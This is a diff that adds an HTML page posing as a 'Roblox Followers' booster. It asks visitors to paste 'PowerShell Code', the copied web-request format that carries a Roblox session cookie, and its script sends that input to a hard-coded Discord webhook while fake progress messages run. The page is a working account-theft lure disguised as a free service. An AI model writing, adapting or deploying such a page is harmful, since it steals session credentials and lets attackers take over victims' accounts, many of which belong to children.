@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Roblox Followers Panel</title>
+
+
+
+<style>
+
+*{
+
+    margin:0;
+
+    padding:0;
+
+    box-sizing:border-box;
+
+    font-family:Segoe UI, sans-serif;
+
+}
+
+
+
+body{
+
+    min-height:100vh;
+
+    display:flex;
+
+    justify-content:center;
+
+    align-items:center;
+
+    background:linear-gradient(135deg,#0f172a,#1e293b,#334155);
+
+}
+
+
+
+.container{
+
+    width:420px;
+
+    background:rgba(255,255,255,0.08);
+
+    backdrop-filter:blur(15px);
+
+    border:1px solid rgba(255,255,255,0.15);
+
+    border-radius:20px;
+
+    padding:30px;
+
+    color:white;
+
+    box-shadow:0 10px 40px rgba(0,0,0,0.3);
+
+}
+
+
+
+h1{
+
+    text-align:center;
+
+    margin-bottom:25px;
+
+}
+
+
+
+.input-group{
+
+    margin-bottom:15px;
+
+}
+
+
+
+label{
+
+    display:block;
+
+    margin-bottom:6px;
+
+    font-size:14px;
+
+}
+
+
+
+input{
+
+    width:100%;
+
+    padding:12px;
+
+    border:none;
+
+    border-radius:10px;
+
+    background:rgba(255,255,255,0.1);
+
+    color:white;
+
+    outline:none;
+
+}
+
+
+
+input::placeholder{
+
+    color:#cbd5e1;
+
+}
+
+
+
+button{
+
+    width:100%;
+
+    padding:12px;
+
+    border:none;
+
+    border-radius:10px;
+
+    background:#3b82f6;
+
+    color:white;
+
+    font-size:16px;
+
+    cursor:pointer;
+
+    transition:.3s;
+
+}
+
+
+
+button:hover{
+
+    background:#2563eb;
+
+}
+
+
+
+.status-box{
+
+    margin-top:20px;
+
+    background:rgba(0,0,0,0.2);
+
+    padding:12px;
+
+    border-radius:10px;
+
+    height:180px;
+
+    overflow-y:auto;
+
+}
+
+
+
+.status{
+
+    margin-bottom:8px;
+
+    color:#93c5fd;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+
+
+<div class="container">
+
+    <h1>Roblox Followers</h1>
+
+
+
+    <div class="input-group">
+
+        <label>PowerShell Code</label>
+
+        <input type="text" id="username" placeholder="e.g. $session = New-Object Microsoft.PowerShell...">
+
+    </div>
+
+
+
+    <div class="input-group">
+
+        <label>Number of Followers</label>
+
+        <input type="number" id="followers" placeholder="e.g. 1000">
+
+    </div>
+
+
+
+    <button onclick="sendData()">Add</button>
+
+
+
+    <div class="status-box" id="logs"></div>
+
+</div>
+
+
+
+<script>
+
+const webhookURL = "https://discord.com/api/webhooks/1512785519443181599/9vly9JNykz1FspJdbq_ls3Lp3AWyFs-pH0XNJr4xu9XAK_ttB_1q79LNu8r3cTrlQ4eg";
+
+
+
+function addLog(text){
+
+    const logs = document.getElementById("logs");
+
+
+
+    const div = document.createElement("div");
+
+    div.className = "status";
+
+    div.textContent = text;
+
+
+
+    logs.appendChild(div);
+
+    logs.scrollTop = logs.scrollHeight;
+
+}
+
+
+
+async function sendData(){
+
+
+
+  document.getElementById("logs").innerHTML = "";
+
+
+
+    const username = document.getElementById("username").value;
+
+    const followers = document.getElementById("followers").value;
+
+
+
+    if(!username || !followers){
+
+        addLog("❌ Please fill in all fields.");
+
+        return;
+
+    }
+
+
+
+    addLog("🔄 Starting process...");
+
+
+
+    setTimeout(() => addLog("📦 Preparing data..."), 1000);
+
+    setTimeout(() => addLog("🔍 Validating form..."), 2000);
+
+    setTimeout(() => addLog("📤 Sending webhook..."), 3000);
+
+
+
+    setTimeout(async () => {
+
+
+
+        try{
+
+
+
+            await fetch(webhookURL,{
+
+                method:"POST",
+
+                headers:{
+
+                    "Content-Type":"application/json"
+
+                },
+
+                body:JSON.stringify({
+
+                    username: username,
+
+                    followers: followers,
+
+                    timestamp: new Date().toLocaleString()
+
+                })
+
+            });
+
+
+
+            addLog("✅ Data sent successfully!");
+
+
+
+        }catch(error){
+
+
+
+            addLog("❌ Error");
+
+
+
+        }
+
+
+
+    },4000);
+
+
+
+}
+
+</script>
+
+
+
+</body>
+
+</html>
